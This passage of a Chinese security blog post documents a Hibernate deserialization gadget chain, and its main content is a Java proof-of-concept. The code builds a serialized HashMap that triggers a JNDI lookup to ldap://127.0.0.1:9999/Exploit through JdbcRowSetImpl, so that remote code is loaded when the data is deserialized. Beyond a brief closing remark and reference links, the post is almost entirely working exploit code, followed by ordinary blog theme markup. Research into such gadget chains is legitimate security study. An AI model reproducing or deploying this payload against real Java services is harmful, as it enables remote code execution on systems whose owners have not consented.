+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.*;
+import java.util.HashMap;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * Hello world!</span>
+<span class="hljs-comment"> *</span>
+<span class="hljs-comment"> */</span>
+public <span class="hljs-keyword">class</span> Hibernate2 &#123;
+
+    public static String fileName = <span class="hljs-string">&quot;Hibernate1.bin&quot;</span>;
+    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;
+        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        field.set(obj, value);
+    &#125;
+    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;
+        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;
+        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;
+        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;
+    &#125;
+    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;
+        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;
+    &#125;
+
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+
+        Class&lt;?&gt; componentTypeClass             = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.type.ComponentType&quot;</span>)</span>;
+        Class&lt;?&gt; pojoComponentTuplizerClass     = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>)</span>;
+        Class&lt;?&gt; abstractComponentTuplizerClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>)</span>;
+
+
+        <span class="hljs-comment">// 生成JdbcRowxxx</span>
+        JdbcRowSetImpl rs = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JdbcRowSetImpl()</span>;
+        rs.set<span class="hljs-constructor">DataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:9999/Exploit&quot;</span>)</span>;
+        Method <span class="hljs-keyword">method</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JdbcRowSetImpl</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;getDatabaseMetaData&quot;</span>)</span>;
+        Object getter;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>
+            Class&lt;?&gt;       getterImpl  = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>)</span>;
+            Constructor&lt;?&gt; constructor = getterImpl.get<span class="hljs-constructor">DeclaredConstructors()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;
+            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">null</span>, <span class="hljs-params">null</span>, <span class="hljs-params">method</span>)</span>;
+        &#125; catch (Exception ignored) &#123;
+            <span class="hljs-comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>
+            Class&lt;?&gt;       basicGetter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>)</span>;
+            Constructor&lt;?&gt; constructor = basicGetter.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>, Method.<span class="hljs-params">class</span>, String.<span class="hljs-params">class</span>)</span>;
+            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">rs</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-keyword">method</span>, <span class="hljs-string">&quot;databaseMetaData&quot;</span>);
+        &#125;
+
+        <span class="hljs-comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span>
+        Object tuplizer = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">pojoComponentTuplizerClass</span>)</span>;
+
+        <span class="hljs-comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span>
+        Field field = abstractComponentTuplizerClass.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;getters&quot;</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        Object getters = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">getter</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-number">1</span>);
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(getters, <span class="hljs-number">0</span>, getter);
+        field.set(tuplizer, getters);
+
+        <span class="hljs-comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span>
+        Object <span class="hljs-keyword">type</span> = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">componentTypeClass</span>)</span>;
+
+        <span class="hljs-comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span>
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;componentTuplizer&quot;</span>,<span class="hljs-params">tuplizer</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertySpan&quot;</span>,1)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertyTypes&quot;</span>,<span class="hljs-params">new</span> Type[]&#123;(Type)</span> <span class="hljs-keyword">type</span>&#125;);
+
+        <span class="hljs-comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span>
+        TypedValue typedValue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TypedValue((Type)</span> <span class="hljs-keyword">type</span>, null);
+
+        <span class="hljs-comment">// 创建反序列化用 HashMap</span>
+        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;
+        hashMap.put(typedValue, <span class="hljs-string">&quot;su18&quot;</span>);
+
+        <span class="hljs-comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span>
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">typedValue</span>,<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-params">rs</span>)</span>;
+
+        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;
+        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">hashMap</span>)</span>;
+        oos.close<span class="hljs-literal">()</span>;
+
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(barr);
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">new</span> ByteArrayInputStream(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>));
+        Object o = (Object)ois.read<span class="hljs-constructor">Object()</span>;
+    &#125;
+
+&#125;</code></pre></div>
+
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>其实还是有好多不理解的地方，唉。。。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-3/">https://su18.org/post/ysoserial-su18-3/</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/">https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hibernate利用链</div>
+      <div>https://zer0peach.github.io/2024/03/08/Hibernate利用链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/07/groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="groovy反序列化">
+                        <span class="hidden-mobile">groovy反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
